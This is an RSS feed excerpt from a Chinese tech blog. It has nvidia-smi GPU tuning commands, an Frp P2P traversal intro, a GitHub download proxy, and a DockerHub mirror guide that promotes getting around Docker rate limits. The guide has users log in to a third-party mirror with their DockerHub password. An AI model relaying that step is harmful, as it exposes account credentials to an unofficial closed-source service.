<span class="line"><span>MIG：Multi-Instance GPU，多实例显卡技术，支持将一张显卡划分成多张显卡使用，目前只支持安培架构显卡。</span></span>
<span class="line"><span>新的多实例GPU (MIG)特性允许GPU(从NVIDIA安培架构开始)被安全地划分为多达7个独立的GPU实例。</span></span>
<span class="line"><span>用于CUDA应用，为多个用户提供独立的GPU资源，以实现最佳的GPU利用率。</span></span>
<span class="line"><span>对于GPU计算能力未完全饱和的工作负载，该特性尤其有益，因此用户可能希望并行运行不同的工作负载，以最大化利用率。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>开启持久模式</h2>
<p>设置目标 GPUs 的持久模式。有关持久性模式的描述，请参见 (GPU ATTRIBUTES) 部分。需要 root。除非使用 -i 参数指定单个 GPU，否则它将影响所有 GPU。此操作的效果是立竿见影的。但是，它不会在重新启动后持续存在。每次重新启动后，持久性模式将默认为 Disabled。仅在 Linux 上可用。</p>
<p>persistence mode 持续模式默认关闭。persistence mode 能够让 GPU 更快响应任务，待机功耗增加。关闭 persistence mode 同样能够启动任务。</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>nvidia-smi -pm 1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>Persistence-M 从 Off 变成 On，持续模式打开。</p>
<h2>设置功耗</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -pl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [330功耗]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>锁核心频率</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CLOCK</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>【功能】查看当前的 GPU 时钟速度、默认时钟速度和最大可能的时钟速度</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SUPPORTED_CLOCKS</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>【功能】显示每个 GPU 的可用时钟速度列表</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lgc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1035</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>将显卡核心频率锁定在1035MHz</p>
<h2>锁显存频率</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lmc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xxxx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>将显存频率锁定到xxxx</p>
<p>使用nvidia-smi -rgc 即可恢复自动频率。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rgc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>显存和核心频率同时设置</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ac</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3003,1531</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>超频： nvidia-smi-i(显卡号） -ac（你想要的显存频率数字），（你想要的核心频率数字）</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-ac,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --applications-clocks=MEM_CLOCK,GRAPHICS_CLOCK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">将最大[内存、图形]时钟指定为一对（例如</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2000,800）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">它定义了在</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 上运行应用程序时</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU™的速度。为</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">来自</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Kepler+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 系列的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Tesla</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设备和基于</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Maxwell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GeForce</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Titan。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">需要</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root，除非使用</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -acp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命令放宽了限制。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Frp实现p2p穿透流量不经过公网服务器</title>
      <link>https://www.geekery.cn/note-book/Frp/Frp%E5%AE%9E%E7%8E%B0p2p%E7%A9%BF%E9%80%8F%E6%B5%81%E9%87%8F%E4%B8%8D%E7%BB%8F%E8%BF%87%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Frp/Frp%E5%AE%9E%E7%8E%B0p2p%E7%A9%BF%E9%80%8F%E6%B5%81%E9%87%8F%E4%B8%8D%E7%BB%8F%E8%BF%87%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Frp实现p2p穿透流量不经过公网服务器</source>
      <description>Frp实现p2p穿透流量不经过公网服务器 从公网买服务器的时候经常遇到带宽太小的问题，国内的网络又非常的慢，导致每MB的价格非常的昂贵，搭建frp服务器总会被流量低速卡脖子卡脖子，有一天我看到Frp提供了一个叫Xtcp的传输模式，这种模式可以点对点的传输流量而流量不经过公网服务器，只要两台个人电脑都可以被穿透就可以，这让我非常感兴趣，解决了带宽卡脖子的...</description>
      <pubDate>Sun, 25 Feb 2024 03:13:47 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>从公网买服务器的时候经常遇到带宽太小的问题，国内的网络又非常的慢，导致每MB的价格非常的昂贵，搭建frp服务器总会被流量低速卡脖子卡脖子，有一天我看到Frp提供了一个叫Xtcp的传输模式，这种模式可以点对点的传输流量而流量不经过公网服务器，只要两台个人电脑都可以被穿透就可以，这让我非常感兴趣，解决了带宽卡脖子的问题。下面对这种使用xtcp协议实现流量穿透内网的方式进行简单探究。</p>
</blockquote>
<h2>原理解析</h2>
<h3>步骤1 打通两个节点的内网（udp打洞）</h3>
]]></content:encoded>
    </item>
    <item>
      <title>GitHub加速下载</title>
      <link>https://www.geekery.cn/free-service/github-direct.html</link>
      <guid>https://www.geekery.cn/free-service/github-direct.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GitHub加速下载</source>
      <description>GitHub加速下载 在Linux上下载GitHub文件太慢了，直接受不了。于是我做了一个用于加速 GitHub 文件下载速度的代理服务，旨在帮助用户更快地获取 GitHub 上的文件、Releases、archive、gist以及raw.githubusercontent.com 文件。通过我们的代理服务，你可以更快地下载这些文件，提高效率，节省时间...</description>
      <pubDate>Wed, 21 Feb 2024 05:20:51 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在Linux上下载GitHub文件太慢了，直接受不了。于是我做了一个用于加速 GitHub 文件下载速度的代理服务，旨在帮助用户更快地获取 GitHub 上的文件、Releases、archive、gist以及raw.githubusercontent.com 文件。通过我们的代理服务，你可以更快地下载这些文件，提高效率，节省时间。</p>
<ul>
<li>
<p>地址： <a href="https://github.geekery.cn/" target="_blank" rel="noopener noreferrer">https://github.geekery.cn/</a></p>
</li>
<li>
<p>项目源码： <a href="https://github.com/Paper-Dragon/github-proxy" target="_blank" rel="noopener noreferrer">https://github.com/Paper-Dragon/github-proxy</a></p>
</li>
</ul>
<h2>主要功能</h2>
<ul>
<li>加速 GitHub 文件下载</li>
<li>提供对 Releases 的加速访问</li>
<li>加速 archive 和 gist 的下载</li>
<li>优化 <a href="https://raw.githubusercontent.com" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com</a> 文件的下载速度</li>
<li>加速 <a href="https://codeload.github.com" target="_blank" rel="noopener noreferrer">https://codeload.github.com</a> 的下载</li>
</ul>
<h2>如何使用</h2>
<p>您只需将原始URL替换为我代理服务的地址，即可享受到加速下载的便利。举例：</p>

<h2>联系我</h2>
<p>如果您有任何问题或建议，请随时评论区联系我。仅供学习使用，非法使用必追究法律责任！</p>
]]></content:encoded>
    </item>
    <item>
      <title>Nginx作为推流服务器</title>
      <link>https://www.geekery.cn/note-book/Nginx-OpenResty/Nginx%E4%BD%9C%E4%B8%BA%E6%8E%A8%E6%B5%81%E6%9C%8D%E5%8A%A1%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Nginx-OpenResty/Nginx%E4%BD%9C%E4%B8%BA%E6%8E%A8%E6%B5%81%E6%9C%8D%E5%8A%A1%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nginx作为推流服务器</source>
      <description>Nginx作为推流服务器 教程里使用的 https://github.com/arut/nginx-rtmp-module.git 这个模块太老了，3年之前更新过，所以重新更改方案使用了https://github.com/winshining/nginx-http-flv-module，这个模块在实现前者的功能的同时还实现了flv拉流量的功能，功能上...</description>
      <pubDate>Sun, 18 Feb 2024 10:10:32 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>教程里使用的 <a href="https://github.com/arut/nginx-rtmp-module.git" target="_blank" rel="noopener noreferrer">https://github.com/arut/nginx-rtmp-module.git</a> 这个模块太老了，3年之前更新过，所以重新更改方案使用了<a href="https://github.com/winshining/nginx-http-flv-module" target="_blank" rel="noopener noreferrer">https://github.com/winshining/nginx-http-flv-module</a>，这个模块在实现前者的功能的同时还实现了flv拉流量的功能，功能上强很多，而且更新及时。</p>
</blockquote>
<h2>功能对比</h2>
<ul>
<li><a href="https://github.com/arut/nginx-rtmp-module" target="_blank" rel="noopener noreferrer">nginx-rtmp-module</a> 提供的所有功能。</li>
<li>nginx-http-flv-module 的其他功能与 <a href="https://github.com/arut/nginx-rtmp-module" target="_blank" rel="noopener noreferrer">nginx-rtmp-module</a> 的对比：</li>
</ul>
<p>| 功能                     | nginx-http-flv-module | nginx-rtmp-module | 备注                                      |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>DockerHub镜像加速</title>
      <link>https://www.geekery.cn/free-service/docker-hub-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/docker-hub-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">DockerHub镜像加速</source>
      <description>Docker镜像拉取加速服务及配置指南 6月6日，上海交大的 Docker Hub 镜像加速器 宣布因监管要求被下架，Dockerhub 无法访问。具体可看此通知。 image-20241010100318565 功能简介 免费学习使用的Docker镜像拉取加速服务，破解Docker官方限制频率等多种应用场景，无限速拉取镜像。 很多种功能都是独家支持，...</description>
      <pubDate>Tue, 06 Feb 2024 07:55:02 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>6月6日，<a href="https://mirrors.ustc.edu.cn/help/dockerhub.html" target="_blank" rel="noopener noreferrer">上海交大的 Docker Hub 镜像加速器</a> 宣布因监管要求被下架，Dockerhub 无法访问。<a href="https://web.archive.org/web/20240606081039/https://sjtug.org/post/mirror-news/2024-06-06-takedown-dockerhub/" target="_blank" rel="noopener noreferrer">具体可看此通知</a>。</p>
<p></p>
</blockquote>
<h2>功能简介</h2>
<p>免费学习使用的Docker镜像拉取加速服务，破解Docker官方限制频率等多种应用场景，无限速拉取镜像。</p>
<p>很多种功能都是独家支持，源码是闭源的，防止被滥用，根据下面教程设置镜像站即可畅快使用。</p>
<ul>
<li>拉取Dockerhub的私有仓库的镜像加速</li>
<li>推送镜像到Dockerhub账户</li>
<li>一键安装Docker 加速</li>
<li>公共仓库的镜像加速</li>
<li>Docker Search命令专项加速</li>
<li>防火墙和黑名单😢</li>
</ul>
<h2>Docker配置镜像加速</h2>
<blockquote>
<p>Docker镜像加速不同的操作系统有不同的设置方法，需要根据操作系统类型去设置，下面给出了Linux、Windows、Mac操作系统的设置方法。</p>
<p>为了方便使用，Linux设置镜像站已经写为脚本。</p>
</blockquote>
<h3>Linux</h3>
<p>配置镜像站</p>

<p>适用于Ubuntu、Debian、CentOS、Fedora、Arch Linux、openSUSE 等系统。</p>
<p>其他版本可能有细微不同，请访问官方文档获取更多详情。</p>
<h3>MacOS</h3>
<blockquote>
<p>评论区帮忙补个MacOS配置图😘</p>
</blockquote>
<p>对于MacOS上的Docker For Mac用户，您可以通过以下步骤配置镜像加速服务：</p>
<p>点击桌面顶栏的docker图标，选择Preferences。</p>
<p>在Daemon标签下的Registry mirrors列表中加入以下镜像地址：</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">https:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//hub.icert.top/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">https:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//ghcr.geekery.cn/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>点击Apply &amp; Restart按钮使设置生效。</p>
<h3>Windows</h3>
<p>Windows系统上的Docker For Windows用户可以按照以下步骤配置镜像加速服务：</p>
<p>在桌面右下角状态栏中右键docker图标，修改在Docker Engine标签页中的json。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "builder"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "gc"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "defaultKeepStorage"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"20GB"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "enabled"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "experimental"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "https://hub.icert.top/"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "https://ghcr.geekery.cn"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>点击Apply&amp;restart，使配置生效。</p>
<h2>一键安装Docker</h2>
<blockquote>
<p>这个脚本适用于Linux</p>
<p>一键安装脚本，为了防止脚本卡住，于是我做了完整的镜像，包括安装包仓库。默认使用 <code>https://download-docker.geekery.cn</code> 为镜像站</p>
</blockquote>

<h2>通过镜像站拉取DockerHub私有账户的镜像</h2>
<h3>登录到镜像站</h3>
<p>首先，你需要登陆到镜像站。如果还没有登录，可以使用以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> login</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后，系统会提示你输入用户名和密码，输入你的dockerhub用户名密码即可登录。</p>
<h3>拉取私有镜像</h3>
<p>成功登录后，就可以从私有仓库中拉取镜像。使用<code>docker pull</code>命令加上仓库的完整URL以及镜像的名称和标签（如果有的话）。例如：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里 <code>&lt;namespace&gt;</code> 可以是用户名或组织名，<code>&lt;imagename&gt;</code> 是镜像的名字，<code>&lt;tag&gt;</code> 是镜像的版本标签。</p>
<h3>恢复默认镜像名</h3>
<p>如果你想要如同DockerHub镜像一般直接不写域名直接跑，方便后面环境的使用，可以增加如下步骤恢复原有的镜像名称。</p>
<p>执行下面的命令将会更改Docker镜像的镜像站为Dockerhub，方便使用。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt; &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里 <code>&lt;namespace&gt;</code> 可以是用户名或组织名，<code>&lt;imagename&gt;</code> 是镜像的名字，<code>&lt;tag&gt;</code> 是镜像的版本标签。</p>
<h2>通过镜像站推送镜像到DockerHub</h2>
<h3>登录镜像站</h3>
<p>首先，你需要登陆到镜像站。如果还没有登录，可以使用以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> login</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后，系统会提示你输入用户名和密码，输入你的dockerhub用户名密码即可登录。</p>
<h3>更改镜像标记</h3>
<p>你需要tag镜像设置被推送到镜像仓库。使用以下格式的命令来标记镜像：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">local-image-nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">local-ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">hub.icert.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如，如果你有一个名为 <code>myimage</code> 的本地镜像，并且你想将其推送到 <code>hub.icert.top</code> 上的 <code>myuser</code> 名下的 <code>myrepo</code> 仓库，使用如下命令：</p>
